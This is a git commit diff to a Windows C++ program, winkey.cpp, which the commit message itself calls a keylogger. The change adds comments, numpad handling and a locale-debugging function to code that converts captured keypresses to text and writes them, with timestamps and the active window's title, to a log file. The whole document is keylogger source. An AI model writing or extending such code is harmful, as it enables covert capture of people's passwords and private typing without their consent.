56cf51ad0f8c007758aaf9c153bf1830f430a7bc
EclipseT <41400199+EclipseT@users.noreply.github.com>
2022-09-08 18:15:34 +0100

    added some documentation to all functions and trying to get locale to change to handle multiple languages in keylogger

--- winkey.cpp
+++ winkey.cpp
@@ -7,6 +7,19 @@
 #include <ctime>
 #include <chrono>
 
+// function to print current locale in different ways, but it doesn't change when changing language in windows??
+
+void printLocale(){
+	//LCID lcid = GetThreadLocale();
+	wchar_t localname[LOCALE_NAME_MAX_LENGTH];
+	//GetUserDefaultLocaleName(localname, LOCALE_NAME_MAX_LENGTH);
+	if (GetLocaleInfoEx(LOCALE_NAME_USER_DEFAULT, LOCALE_SNATIVEDISPLAYNAME, localname, LOCALE_NAME_MAX_LENGTH) == 0)
+		std::cout << "ERROR READING LOCALE" << std::endl;
+	std::wcout << "!!!!!Locale name = " << localname << std::endl;
+}
+
+/* TranslateKeys() is called on each keypress and simply converts the key press from VK_code to a writable character */
+
 std::string translateKeys(int key){
 	std::string result;
 	if (key == VK_SPACE)
@@ -37,15 +50,21 @@ std::string translateKeys(int key){
 		result = "[DOWN ARROW]";
 	else if (key == VK_SNAPSHOT)
 		result = "[PRINT SCREEN]";
+	else if (key >= 96 && key <= 105){
+		result += key-48;
+	}
 	else
 		result += key;
+	printf("{{{%d}}}\n", key);
+	printLocale();
 	return result;
 }
+
+/* getDate() is called on each log, it uses sprintf to easily get the format we want [DD-MM-YYYY HH:MM:SS] */
 
 std::string getDate() {
 	struct tm* timeinfo;
 	char timestr[21];
-	//std::string timeStr;
 	time_t rawtime;
 
 	time(&rawtime);
@@ -53,11 +72,12 @@ std::string getDate() {
 	timeinfo = localtime(&rawtime);
 	std::cout << timeinfo->tm_mday << std::endl;
 	sprintf(timestr, "[%02d-%02d-%d %02d:%02d:%02d]", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
-	//timeStr = timeArr;
 	return (timestr);
 }
 
-std::string getForegroundProcess(){
+/* getWindowTitle() is also called on each log, it gets the the foreground process ID then calls GetWindowText to get the window title*/
+
+std::string getWindowTitle(){
 	HWND fgw = GetForegroundWindow();
 	char windowtitle[256];
 
@@ -66,6 +86,8 @@ std::string getForegroundProcess(){
 	return windowtitle;
 }
 
+/* Write the date, window title and buffer content to the logfile */
+
 void writeLogs(std::string buf) {
 	std::fstream logfile;
 
@@ -73,7 +95,7 @@ void writeLogs(std::string buf) {
 	std::cout << "||||WRITING TO FILE||||";
 	logfile << getDate();
 	logfile << " - '";
-	logfile << getForegroundProcess();
+	logfile << getWindowTitle();
 	logfile << "' - ";
 	logfile << buf << std::endl;
 	logfile.close();
@@ -98,3 +120,4 @@ void main() {
 		}
 	}
 }
+//
